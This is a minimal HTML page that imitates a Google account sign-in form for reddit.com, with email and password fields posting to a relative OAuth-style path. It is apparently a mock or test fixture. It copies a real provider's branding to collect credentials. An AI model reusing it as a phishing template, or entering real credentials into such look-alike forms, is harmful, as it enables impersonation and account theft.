<!doctype html>
<html lang="en"><head><meta charset="utf-8"><title>Sign in - Google Accounts</title>
<style>body{font:15px sans-serif;margin:30px} input{display:block;margin:8px 0;width:300px;height:34px}</style></head>
<body>
<form method="post" action="/o/oauth2/v2/auth">
  <h1>Sign in with Google</h1>
  <div>to continue to reddit.com</div>
  <input type="email" name="identifier" autocomplete="username" aria-label="Email or phone">
  <input type="password" name="Passwd" autocomplete="current-password" aria-label="Enter your password">
  <button type="submit">Next</button>
</form>
</body></html>
